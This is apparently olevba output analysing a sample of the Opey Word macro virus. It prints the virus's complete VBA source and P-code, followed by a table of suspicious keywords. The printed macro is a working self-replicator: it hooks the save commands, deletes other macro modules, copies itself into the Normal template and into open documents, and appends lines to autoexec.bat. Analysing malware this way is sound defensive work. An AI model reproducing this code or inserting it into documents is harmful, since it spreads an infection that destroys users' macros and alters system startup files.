olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.y
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.y - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO A_OPEY_03.bas 
in file: Virus.MSWord.Opey.y - OLE stream: 'Macros/VBA/A_OPEY_03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub greetings()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
            If ((Month(Date) = 12) And (Day(Date) = 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY HALLOWEEN !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) = 14) Then
                line1$ = "echo HAPPY VALENTINES DAY !!!"
            End If
                If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo from: OPEY A."
                        Print #hFile, "pause"
                    Close hFile
                End If
End Sub
Sub OnlyYou()
  On Error Resume Next
    
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "A_OPEY_03" Then NTInfected = True
                If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(J).Name
                    If clan = "A_OPEY_03" Then ODInfected = True
                    If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next J
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
End Sub
Sub FileSave()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFileSaveAs).Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.y
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/A_OPEY_03 - 4086 bytes
' Line #0:
' 	FuncDefn (Sub greetings())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St autoexecfile$ 
' Line #3:
' 	Ld Friend 
' 	St hFile 
' Line #4:
' 	LitStr 0x0000 ""
' 	St line1$ 
' Line #5:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #6:
' 	LitStr 0x002E "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
' 	St line1$ 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0018 "echo HAPPY HALLOWEEN !!!"
' 	St line1$ 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #12:
' 	LitStr 0x001D "echo HAPPY VALENTINES DAY !!!"
' 	St line1$ 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Ld line1$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #15:
' 	Ld autoexecfile$ 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #16:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #17:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line1$ 
' 	PrintItemNL 
' Line #18:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "echo from: OPEY A."
' 	PrintItemNL 
' Line #19:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #20:
' 	Ld hFile 
' 	Close 0x0001 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub OnlyYou())
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' Line #26:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #28:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #29:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #30:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #33:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #34:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #35:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #36:
' 	Ld J 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #37:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #38:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #39:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #41:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "A_OPEY_03"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndWith 
' Line #45:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "A_OPEY_03"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	ArgsCall (Call) greetings 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub FileSave())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #55:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub FileSaveAs())
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #60:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #61:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

